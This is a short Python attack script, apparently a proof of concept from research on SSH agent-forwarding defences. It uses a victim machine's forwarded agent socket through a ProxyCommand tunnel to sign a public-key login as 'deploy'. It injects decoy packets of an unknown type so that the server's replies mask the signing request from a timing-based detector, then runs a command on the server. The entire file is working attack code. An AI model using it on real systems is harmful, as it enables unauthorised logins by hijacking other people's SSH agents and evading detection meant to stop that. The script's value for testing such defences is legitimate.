"""An outsider who knows about the deadline. Its own Paramiko client, carried into the computer by a
tunnel (ProxyCommand) and using the computer's agent through a relayed socket. When it asks the
agent to sign, it also sends the server a packet of an unknown type, which the server answers with
SSH_MSG_UNIMPLEMENTED. That answer reaches the boundary before the outsider's signed request does,
when the outsider is farther from the computer than the server is.

    attacker_decoy.py <agent socket> <proxy command> [decoys]
"""
import sys, paramiko
from paramiko.message import Message

agent_path, proxy = sys.argv[1], sys.argv[2]
decoys = int(sys.argv[3]) if len(sys.argv) > 3 else 1
import os; os.environ["SSH_AUTH_SOCK"] = agent_path
t = paramiko.Transport(paramiko.ProxyCommand(proxy))
t.start_client(timeout=10)
key = paramiko.Agent().get_keys()[0]
orig = key.sign_ssh_data


def sign_with_decoy(data, algorithm=None):
    for _ in range(decoys):
        m = Message(); m.add_byte(bytes([200])); m.add_string(b"decoy")
        t._send_message(m)
    return orig(data, algorithm)


key.sign_ssh_data = sign_with_decoy
try:
    t.auth_publickey("deploy", key)
    ch = t.open_session(); ch.exec_command("echo outsider-in")
    print(ch.makefile().read().decode().strip())
except Exception as e:
    print("failed:", type(e).__name__, e)
t.close()
